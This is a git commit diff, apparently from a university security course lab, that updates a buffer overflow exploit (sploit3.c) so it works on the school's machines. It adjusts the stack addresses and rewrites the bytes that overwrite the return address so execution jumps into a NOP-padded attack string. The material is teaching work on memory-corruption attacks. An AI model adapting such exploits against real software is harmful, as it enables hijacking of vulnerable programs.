efa9f9686eef6cf51a4f55beea4c8a3ee1930f0d
Nayantara  Prem <premnaya@remote.ecf.utoronto.ca>
2016-01-21 21:13:05 -0500

    sploit3 works on ecf

--- ECE568-lab1/sploits/sploit3.c
+++ ECE568-lab1/sploits/sploit3.c
@@ -8,18 +8,17 @@
 /*
  * ___frame for foo__
  *
- * 0x2021fef8   return addr for foo <---overflow buf till here(store &buf[4] here)
- * 0x2021fef0   sfp
- * 0x2021feef   buf[63]
+ * 0x2021fe58   return addr for foo <---overflow buf till here(store &buf[4] here)
+ * 0x2021fe50   sfp
  * ..
  * ..
- * 0x2021beb4   buf[4] <---start of our attack string
- * 0x2021beb3   buf[3] = "A"
+ * 0x2021fe14   buf[4] <---start of our attack string
+ * 0x2021fe13   buf[3] = "A"
  * ..
- * 0x2021beb0   buf[0] = "A"
+ * 0x2021fe10   buf[0] = "A"
  *
  * Explanation:
- * 0x2021fef8 - 0x2021beb0 = 72B = return of foo - start of buf
+ * 0x2021fe58 - 0x2021fe10 = 72B = return of foo - start of buf
  */
 int
 main ( int argc, char * argv[] )
@@ -43,13 +42,13 @@ main ( int argc, char * argv[] )
     for(;i<68;i++)
         buf[i] = '\x90';
     //for(;i<72;i=i+4){ 
-    //insert addr of buff[4] = 0x2021feb0 + 4
+    //insert addr of buff[4] = 0x2021fe14
      //   buf[i+4] = '\x00'
         buf[72] = '\x00';
         buf[71] = '\x20';
         buf[70] = '\x21';
         buf[69] = '\xfe';
-        buf[68] = '\xb4';
+        buf[68] = '\x14';
    // }
     printf("buf len %d \n", strlen(buf));
     
